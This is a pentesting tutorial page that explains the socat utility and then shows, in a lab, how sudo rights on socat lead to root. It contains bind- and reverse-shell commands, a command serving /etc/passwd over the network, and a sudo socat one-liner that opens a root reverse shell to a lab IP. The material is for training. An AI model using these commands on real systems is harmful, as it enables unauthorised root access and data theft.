<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux For Pentester: socat Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-08-17T14:08:19+00:00">August 17, 2019</time><time class="updated" datetime="2025-06-07T11:05:51+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Welcome back, to grab knowledge of another command from “Linux for pentester” series. As we know there are many tools that can help the user to transfer data. Similarly, we are going to take advantage of another command i.e. “socat” which is a utility for data transfer between two addresses. So, now we will take this benefit of “socat” in our mission of privilege Escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>NOTE: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">Table of Content</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Overview of socat</strong><strong>             </strong></span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">What is socat</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Basic parameters of socat</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">The operation achieved by socat</span></li>
</ul>
<p class="ai-optimize-13"><span style="color: #000000;"><strong>Abusing socat</strong></span></p>
<ul>
<li class="ai-optimize-14"><span style="color: #000000;">SUDO Lab setups for privilege Escalation</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Exploiting SUDO</span></li>
</ul>
<h3 class="ai-optimize-16"><span style="color: #800000;">What is socat</span></h3>
<p class="ai-optimize-17"><span style="color: #000000;">Socat is a network utility similar to netcat which supports ipv6, SSL and is available for both Windows and Linux. The first thing you will notice with this tool is that it has a different syntax on what you are used to with netcat or other standard Unix tools.</span></p>
<p class="ai-optimize-18"><span style="color: #000000;">In other word you can say it is a command-line based utility that inaugurates two bidirectional byte streams and transfers data between them. Because the streams can be built from a large set of different types of data sinks and address type.</span></p>
<p class="ai-optimize-19"><span style="color: #000000;">It is a utility for data transfer between two addresses which uses the syntax as <strong>“socat [options] &lt;address&gt;&lt;address&gt;”</strong>.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;">Now we will start working with this most influencing tool by using its help command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat -h</pre>
<p class="ai-optimize-21"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gp8IzZ_86ig/XVgF-yY92aI/AAAAAAAAgHQ/cyXISUa_RsA98c0ZiYVqie_xkBQ65nGxQCLcBGAs/s1600/1.png"/></span></p>
<h3 class="ai-optimize-22"><span style="color: #800000;">Basic parameters of socat</span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">The most “basic” socat request would be: <strong>socat [options] &lt;address&gt;&lt;address&gt;</strong>but another more existing example would be: <strong>socat -d -d – TCP4:www.example.com:80.</strong></span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><strong>Where “-d -d”</strong> would be the options, <strong>“-“</strong> would be the first address and <strong>TCP:www.example.com:80</strong> would be the second address.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;">The above syntax can be more clearly understand by breaking each component down a bit more. Let’s first start with the address, since the address is the keystone aspect of socat.</span></p>
<h5 class="ai-optimize-26"><span style="color: #000000;"><strong><em><u>Addresses:</u></em></strong></span></h5>
<p class="ai-optimize-27"><span style="color: #000000;">As we know <strong>socat</strong> is comprised with two addresses for executing its result so it is more important to understand that what addresses are in actual and how they work. The address is something that the user provides via the command line. Entreating socat without any addresses results in a note as shown below:</span></p>
<p class="ai-optimize-28"><span style="color: #000000;"><em>~: socat</em></span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><em>2018/09/22 19:12:30 socat[15505] E exactly 2 addresses required (there are 0); use option “-h” for help</em></span></p>
<h5 class="ai-optimize-30"><span style="color: #000000;"><strong><em><u>Type:</u></em></strong></span></h5>
<p class="ai-optimize-31"><span style="color: #000000;">After address, the other component of “socat” is “<strong>type” </strong>which is used to specify the kind of address that we need. Some of popular selections are TCP4, CREATE, EXEC, STDIN, STDOUT, PIPE, UDP4 etc, where the names are pretty self-understandable.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;">This is because certain address types have aliases.<strong> </strong>Similarly <strong>“-“</strong> is one such alias which is used to represent STDIO. Another alias is TCP which stands for TCPv4. You can also use its man page to view lists of all other aliases.</span></p>
<h5 class="ai-optimize-33"><span style="color: #000000;"><strong><em><u>Parameters:</u></em></strong></span></h5>
<p class="ai-optimize-34"><span style="color: #000000;">Instantly after the type socat<em> </em>comes with zero or more required address parameters for its performance which is separated by:</span></p>
<p class="ai-optimize-35"><span style="color: #000000;">The number of address parameters depends on the address type. The <strong>address <em>type</em></strong> TCP4 requires a <strong><em>server description</em></strong><em> </em>and a <strong><em>port description</em></strong>.</span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">The operation achieved by socat</span></h3>
<h5 class="ai-optimize-37"><span style="color: #000000;"><strong>To send and receive text messages bidirectional: </strong></span></h5>
<p class="ai-optimize-37"><span style="color: #000000;">As we know “Socat” is a command-line based utility that establishes two bidirectional byte streams and transfers data between them. Now, I will start to establish a connection between two machines and will transfer messages between both of them.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">For this, we need to start listener at one machine. In below image we have done this for “kali” which is acting as a listener and ready to take all of the commands that are ordered by “ubuntu” as shown below by framing command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – TCP4-LISTEN:4444</pre>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DGlRAy3tlWI/XVgGAZzXqUI/AAAAAAAAgHk/LNfVzemWgf4bLaVoV8k2vlQCfDSdyHY7ACLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">After running listener, our next step is to use socat command on another machine i.e. “ubuntu”. Here we need to specify the <strong>“IP” and port </strong>of the machine on which we have started the listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – TCP4:192.168.1.106:4444</pre>
<p class="ai-optimize-41"><span style="color: #000000;">Now we have succeeded to share text between both terminals as shown in below image.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pSjDXpgAqrA/XVgGA_5OuXI/AAAAAAAAgHo/yTThryyjL8cEXi59qU5FAmEg9pVVru5AQCLcBGAs/s1600/3.png"/></span></p>
<h5 class="ai-optimize-43"><span style="color: #000000;"><strong>EXEC command using socat to take shell</strong>: </span></h5>
<p class="ai-optimize-43"><span style="color: #000000;">socat command also tends the user to take the shell of any machine.  Here in this tutorial, I wish to take the shell of<strong> “ubuntu” </strong>on <strong>“kali”</strong> terminal by <strong>“EXEC type”</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP4-LISTEN:1234,reuseaddr EXEC:/bin/sh</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-47ELUxs2TXI/XVgGBFecfhI/AAAAAAAAgHs/wuVF6jBa1foxcQBxcK-n8uVLHKYpZlw2ACLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Now on framing above command, we have successfully established a connection between two of the machine. After running listener on “ubuntu” now we will use <strong>socat</strong> command on “kali” by specifying the” <strong>IP”</strong> and “<strong>port”</strong> of the machine (ubuntu) which will help us to take the shell of ubuntu on kali as per our request.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – TCP4:192.168.1.100:1234</pre>
<p class="ai-optimize-46"><span style="color: #000000;">Now to check whether you have got the shell of the desired machine or not, you can simply write <strong>“id”. </strong>As in the image below, you can see, it has directed us as user “raj” who is a user of “ubuntu”. It means we have successfully got the shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
whoami
ifconfig</pre>
<p class="ai-optimize-47"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-I5s9vuqkDzQ/XVgGBWNu08I/AAAAAAAAgHw/PdkCiHy5e7gLOsDQSyUYe32mJpB4NYf_wCLcBGAs/s1600/5.png"/></strong></span></p>
<h5 class="ai-optimize-48"><span style="color: #000000;"><strong>EXEC command using socat to transfer a file: </strong></span></h5>
<p class="ai-optimize-48"><span style="color: #000000;">Now we will use another function of “EXEC” to transfer a file, here I want to transfer <strong>“passwd” file from </strong>“ubuntu” to “kali and again we will follow the same process.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP4-LISTEN:1234,reuseaddr EXEC:"cat /etc/passwd"</pre>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--qqJMk0aL0g/XVgGBtIQaqI/AAAAAAAAgH0/kvw3AnKbghgxYe09ox6YmDesCPWVslIYgCLcBGAs/s1600/6.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – TCP4:192.168.1.100:1234</pre>
<p class="ai-optimize-50"><span style="color: #000000;">As we switch to Kali and run socat command, it will result in us by opening “passwd” file of “source machine”.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>Working with socat using another type</strong>: As we know socat uses the list of “type” like CREATE, EXEC, STDIN, STDOUT, PIPE etc.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Here in the image below, I have a text file named as “test” and now I want my listener machine to execute this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat test
cat test | socat – TCP4:192.168.1.100:4444</pre>
<p class="ai-optimize-53"><span style="color: #000000;">By using the above command first, I have requested to open “test” file, then I have piped this output as the input for socat command.</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1h9QAUuiDLM/XVgGCSKNMEI/AAAAAAAAgH8/euNipoO_pq4Ccu_4glLgU9CILCYQiOqrgCLcBGAs/s1600/8.png"/></strong></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">As from the image below you can see I have used the “OPEN” function to which I have requested to create a file</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"> by the name of “raj” and will append the content of the “test” file to this newly created file, i.e., “raj”.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;">So now, when I run the listener on “ubuntu”, it will execute the “raj” file, showing the content of the </span><span style="color: #000000;">“test” file as desired.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP4-LISTEN:4444,reuseaddr  OPEN:raj,creat,append
cat raj</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xiaxGsFmtnM/XVgGCfhnedI/AAAAAAAAgIA/KQROeIc6zP471XUBLKJ_k4ddVsn49dcigCLcBGAs/s1600/9.png"/></span></p>
<h3 class="ai-optimize-60"><span style="color: #800000;"><strong>Abusing socat</strong></span></h3>
<h4 class="ai-optimize-61"><span style="color: #000000;">Sudo Rights Lab setups for Privilege Escalation</span></h4>
<p class="ai-optimize-62"><span style="color: #000000;">Now we will start our mission for privilege escalation. For this alike another command from “Linux for pentester” series here also first we need to set up our lab of “socat” command with administrative rights.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;">It can be clearly understood by the below image in which I have set sudo permission to local user (test) who can now run “socat command” as the root user.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">To add sudo right open etc/sudoers file and type following as user Privilege specification.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">test ALL=(root) NOPASSWD: /usr/bin/socat</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8b-P_D00QrE/XVgF-61gvZI/AAAAAAAAgHM/VgeZ2bcLBecD12Rft4QIuwPXBq3nE65wwCLcBGAs/s1600/10.png"/></span></p>
<h3 class="ai-optimize-66"><span style="color: #000000;"><span style="color: #800000;">Exploiting Sudo rights</span> </span></h3>
<h4 class="ai-optimize-67"><span style="color: #800000;">First Method:</span></h4>
<p class="ai-optimize-68"><span style="color: #000000;">Then, we will start exploiting the socat facility by taking the privilege of sudoer’s permission. For this very first we must have sessions of a victim’s machine then only we can execute this task.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;">So now we will connect to the target machine with ssh, therefore, type following command to get access through local user login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-70"><span style="color: #000000;">As we know “test” user attains sudo user privileges so now we will try to attain root shell of the host’s machine by the help of socat using EXEC options. Then we look for sudo right for “test” user (if given) and found that user “test” can execute the socat command as “root” without a password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo socat TCP4-LISTEN:1234, reuseaddr EXEC:"/bin/sh"</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n5MyN6GLHrE/XVgF-9PlefI/AAAAAAAAgHU/53n0o04zMwwICl5mf_3Ycc1FwNs1VD9_gCLcBGAs/s1600/11.png"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">Then, on a new terminal launch socat as a listener and enter the source IP and source port along with socat command to obtain reverse shell of the host machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – TCP4:192.168.1.100:1234</pre>
<p class="ai-optimize-73"><span style="color: #000000;">Now we have successfully got the shell of the victim’s machine with root privilege as shown in screenshot below.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-vRTD-pzhzXg/XVgF_jQ5JnI/AAAAAAAAgHY/ya9iMqsJtC8zN-OnkoVh-8FARnrzESWeACLcBGAs/s1600/12.png"/></strong></span></p>
<h4 class="ai-optimize-75"><span style="color: #800000;">Second Method:</span></h4>
<p class="ai-optimize-76"><span style="color: #000000;">We have another method to escalate the higher privilege shell i.e. using socat one liner reverse shell command. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo socat exec:'sh –li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.106:1234</pre>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J9ICWpa_s1s/XVgF_1f9hOI/AAAAAAAAgHc/jSrwzQepoWkBNQ7FXmbUUgamLEdD_EMDACLcBGAs/s1600/13.png"/></span></p>
<p class="ai-optimize-78"><span style="color: #000000;">Then, on the new terminal, start the socat as a listener and obtain root shell of the remote machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat file: 'tty',raw,echo=0 tcp-listen:1234</pre>
<p class="ai-optimize-79"><span style="color: #000000;"><strong>Conclusion</strong>: Hence in this way, we can make use of “socat” command to escalate the privilege of the remote machine.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CE_LH40u1V8/XVgGAarj-GI/AAAAAAAAgHg/M5dsmxoGp_oJS6AHcV6te2tSSH5u9-bugCLcBGAs/s1600/14.png"/></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-81"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
